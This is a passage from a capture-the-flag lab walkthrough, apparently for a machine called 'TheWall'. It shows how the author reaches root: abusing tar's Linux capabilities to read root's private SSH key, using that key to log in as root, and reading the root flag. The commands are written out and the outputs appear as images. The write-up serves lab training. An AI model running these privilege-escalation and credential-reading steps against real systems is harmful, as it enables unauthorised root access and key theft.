<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>5.4 Get root (Second flag)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>5.4 Get root (Second flag)</h1><br/><p></p><p>1. On the SSH connection list the “/” files.</p><p>    <div class="codebox"><pre>john@TheWall<span style="color:#a52a2a;font-weight:700">:/</span>$ <span style="color:#a52a2a;font-weight:700">ls</span> -al </pre></div></p><p></p><p>    <span style="color:#ffa500;">Output:</span></p><p>    <img src="images/1091-1.png" alt="images/1091-1.png" /></p><p>    </p><p>    There are two filws “id_rsa&quot; and &quot;id_rsa.pub”</p><p>    </p><p>2. Use tar capabilities to read root&#39;s private key. More info <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities">here</a>. </p><p>    <div class="codebox"><pre>john@TheWall<span style="color:#a52a2a;font-weight:700">:</span>~$ <span style="color:#a52a2a;font-weight:700">/</span>sbin<span style="color:#a52a2a;font-weight:700">/tar</span> cf id_rsa.tar <span style="color:#a52a2a;font-weight:700">/</span>id_rsa<br />john@TheWall<span style="color:#a52a2a;font-weight:700">:</span>~$ <span style="color:#a52a2a;font-weight:700">tar</span> xf id_rsa.tar<br />john@TheWall<span style="color:#a52a2a;font-weight:700">:</span>~$ <span style="color:#a52a2a;font-weight:700">cat</span> id_rsa</pre></div></p><p>    Now the “id_rsa” file has the “root” private key.</p><p></p><p>    <span style="color:#ffa500;">Output:</span></p><p>    <img src="images/1091-2.png" alt="images/1091-2.png" /></p><p>    </p><p>    <img src="images/1091-3.png" alt="images/1091-3.png" /></p><p></p><p>3. Connect via SSH using that private key.</p><p>    <div class="codebox"><pre>john@TheWall<span style="color:#a52a2a;font-weight:700">:</span>~$ <span style="color:#a52a2a;font-weight:700">ssh</span> root@192.168.12.71 -i id_rsa</pre></div></p><p>    <span style="color:#ffa500;">Output:</span></p><p>    <img src="images/1091-4.png" alt="images/1091-4.png" /></p><p>   </p><p>    You are “root”.</p><p></p><p>4. Run the following commands to read the flag.</p><p>    <div class="codebox"><pre>root@TheWall<span style="color:#a52a2a;font-weight:700">:</span>~# <span style="color:#a52a2a;font-weight:700">ls</span><br />root@TheWall<span style="color:#a52a2a;font-weight:700">:</span>~# <span style="color:#a52a2a;font-weight:700">cat</span> r0Ot.txT </pre></div></p><p></p><p>    <span style="color:#ffa500;">Output:</span></p><p>    <img src="images/1091-5.png" alt="images/1091-5.png" />    </p><p>    </p><p align="center"><img src="images/home.svg" height="22" width="22">  <a href="index.html">Index</a></p></div>
</body>
</html>
